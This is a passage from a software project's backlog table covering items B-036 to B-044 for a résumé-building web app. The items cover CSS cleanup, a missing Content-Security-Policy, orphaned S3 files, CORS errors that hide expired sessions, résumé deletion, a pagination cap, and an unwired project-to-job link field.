| B-036 | **The Résumés view is the last thing in `.legacy-view`, and it holds the last four shim aliases.** `resume.css` is the only remaining consumer of `--text-h`, `--text`, `--accent-border` and `--accent-bg`; the temporary `:root` block in [`index.css`](../frontend/src/index.css) and the `.legacy-view` wrapper in [`App.css`](../frontend/src/App.css) both exist solely for it, as does the `renders the redesigned views without the legacy wrapper` carve-out in `App.test.tsx`. All four die together when slice 3 rebuilds the view. | tech-debt | P2 | v1.1-slice-2 | done | Not a defect — the scaffolding is working as designed. Logged so the *completion condition* is written down rather than remembered: slice 3 is not done until that `:root` block is gone, `.legacy-view` is deleted, and `resume.css`'s one intentional `#fff` (print paper-white, which is not a theme colour) is either tokenised or explicitly exempted. Verify with the grep recorded in the `index.css` comment. Blocked with the view itself on **B-028**. |
| B-037 | **"Record N" renumbers everything after a deleted entry.** The Timeline's detail-panel label counts deposit order over the whole corpus, so deleting record 3 turns 4 into 3 and shifts every later record. Fine as a display label; wrong the moment anyone cites, bookmarks or screenshots one. A stable alternative is a stored monotonic counter on the PROFILE item, incremented at write time. | ui | P3 | v1.1-slice-2 | open | Deliberate trade recorded at the moment it was made, not discovered later. The alternative — deriving nothing and showing only the entry type — loses a piece of the vault metaphor the design leans on. Revisit if record numbers ever become referenceable (an export, a share link, a résumé citation), which is exactly when a shifting identifier stops being cosmetic. |
| B-038 | **No CSP on the CloudFront distribution.** The SAM template defines no `ResponseHeadersPolicy`, so the app ships without `Content-Security-Policy`, `X-Content-Type-Options` or `Referrer-Policy`. Self-hosting the fonts (B-032) removed the only external subresource, which makes a strict `default-src 'self'` policy genuinely cheap to adopt now — the app fetches nothing cross-origin except its own API and Cognito. | infra | P2 | v1.1-slice-2 | open | Surfaced by the slice-2 security review as the structural half of B-032: self-hosting removes the *exposure*, a CSP removes the *class*. Note the two Cognito origins (Hosted UI redirect, token endpoint) and the API Gateway origin must be enumerated in `connect-src`/`form-action` or sign-in breaks — which is why this is its own item rather than a one-line addition, and why it wants a smoke test of the full auth round-trip after deploy. |

| B-039 | **A failed `RESUME#` write now orphans S3 artifacts permanently.** ADR-046 removed the `resumes/` lifecycle rule, so the worker's `create_resume_record` failure path — which deliberately swallows the error so a completed run still succeeds — leaves HTML+PDF in S3 that nothing references and nothing will ever delete. Before ADR-046 the same failure self-corrected in 30 days. The `ResumeRecordWriteFailed` metric is emitted but **nothing alarms on it**, so the first symptom would be a résumé missing from history with no other signal. Options: alarm on the metric (cheapest), a reconciliation pass over `resumes/` prefixes with no matching record, or write the record before uploading and accept the reverse skew. | tech-debt | P3 | v1.1-slice-3 | open | Surfaced while implementing ADR-046. Genuinely low-probability (a `PutItem` failing after five successful DynamoDB calls in the same invocation) and low-impact (~100 KB), which is why it is P3 rather than fixed in-slice — logged because it is a *new* failure mode created by removing the lifecycle rule, and the kind that is invisible until an audit. Same family as **B-019** (a metric emitted with nothing alarming on it). |
| B-040 | **`scripts/backfill-resume-records.py` is one-time and should be retired.** It exists to build `RESUME#` records for runs that completed before ADR-046, and its source data — the `RESUMERUN#` traces — is gone after **2026-08-28**, at which point the script can only ever be a no-op. Delete it then, or keep it as the worked example of an idempotent dry-run-first migration. | tech-debt | P3 | v1.1-slice-3 | open | Already run against the one real user (6 records written, verified idempotent). Left in the tree deliberately rather than deleted immediately: if the backfill turns out to have mapped something wrong, re-running after deleting the bad records is the recovery path, and that only works while the traces exist. |

| B-041 | **An expired session surfaces as an opaque CORS error, not "please sign in".** API Gateway's default 4XX responses carry no `Access-Control-Allow-Origin`, so when the Cognito authorizer rejects a stale JWT the browser reports *"blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present"* and the app logs `TypeError: Failed to fetch` — the status code never reaches JS, so the client cannot tell "your session expired" from "the API is down" and shows neither. Fix is a `GatewayResponses` block in [`template.yaml`](../infrastructure/template.yaml) adding the CORS headers to `DEFAULT_4XX`/`DEFAULT_5XX`, after which the client can read the 401 and route to re-auth. | ui | P2 | v1.1-slice-3 | open | Found while browser-verifying the theme toggle: the dev-server console showed five errors that looked like a CORS regression from the day's two deploys. Ruled out by curl — preflight returns `200 ACAO=*` on `/entries`, `/settings` **and** the new `/resumes`, while an unauthenticated `GET /resumes` returns `401` with no ACAO. Pre-existing since slice 4 and unrelated to ADR-046, but genuinely misleading: it cost real time to disprove, and it would cost it again. |

| B-042 | **Résumé deletion, shipped in v1.1 slice 3 — logged for the record because it changed scope mid-slice.** ADR-046 made résumés permanent, which silently removed the only thing that used to clear them (the flat 30-day expiry). `DELETE /resumes/{run_id}` now removes the S3 artifacts, the `RESUME#` record and the `RESUMERUN#` trace, behind ADR-027's UI confirm. | feature | P1 | v1.1-slice-3 | done | Raised by Oche on seeing the finished history grid. Closed in-slice rather than deferred: shipping "your résumés are kept" with no way to remove one is incomplete as delivered, and the gap was created by this slice's own decision. See the **ADR-046 amendment** for the S3-before-DynamoDB ordering and the new `DeleteItem`/`DeleteObject` grants. |

| B-043 | **`GET /resumes` caps at 50 with no pagination and no truncation signal, on a feature whose premise is permanence.** `query_resumes` passes `Limit=50` and discards `LastEvaluatedKey`; the response carries no cursor and no "there are more" flag. Past 50 résumés a row is not just unlisted but **unreachable**: `GET /resumes/{run_id}` and `DELETE /resumes/{run_id}` both need a `run_id` the UI can only learn from the list, so the artifacts persist forever (ADR-046 removed the lifecycle rule) with no way to view or remove them. Fix: return a cursor, or at minimum a `truncated` flag the grid can surface. | tech-debt | P2 | v1.1-slice-3 | open | Surfaced in the v1.1 slice 3 code review; **not fixed in-slice deliberately** — at ADR-046's own stated rate of roughly one résumé a week this is ~1 year away for the single MVP user, and the fix is a real API-shape decision (cursor vs. flag vs. cap) rather than a patch. Worth doing before it is urgent, because the failure mode is silent. Related: **B-039** (orphaned artifacts). |
| B-044 | **Projects are never linked to the role they were done under — `related_job_id` is a designed field wired to nothing at three separate points.** `ProjectEntry` and `MilestoneEntry` both declare `related_job_id`, `tools.py` describes it to Haiku, and the architecture doc §2.7 documents it — but (1) the **parse turn never sees the user's existing entries**, so Haiku has no JOB ULID available and can only leave it null or invent one (the tool description's "only if the user explicitly referenced one" is what suppresses the hallucination); (2) the **résumé agent never reads it**, so projects are never grouped as bullets under their employer; and (3) the **frontend never surfaces it**, so there is no manual way to set it either. Net effect: a user says "this project is part of my role at KPMG", the model logs a PROJECT, and the association is silently dropped. | feature | P2 | v1.1 slice 4 | open | Raised by Oche 2026-08-11 after logging a real work project. **The schema already supports this — the gap is entirely in ingestion, output, and UI.** Two design routes: (a) **by ULID** — give the parse turn the user's JOB entries (id, employer, dates) so it can reference one, which costs input tokens on *every* parse turn against a $5 ceiling and grows with the corpus (same mechanism as B-004/B-013); or (b) **by employer string** — `ProjectEntry.employer` already exists, so the résumé agent could group on employer + date-range overlap with no ingestion change, no added tokens and no new endpoint, at the cost of being a heuristic that mis-groups two stints at the same employer. (b) is much cheaper and probably the right first move; (a) is the correct end state. Worth pairing with a manual link/edit control, since the deterministic fix for both is letting the user set it. Sequence after B-023/B-020 — this changes résumé *content*, and changing content while latency is unmeasured confounds both. |

<!-- Add new rows at the bottom. Keep each item to one line; detail goes in Notes or a linked ADR/plan section. -->
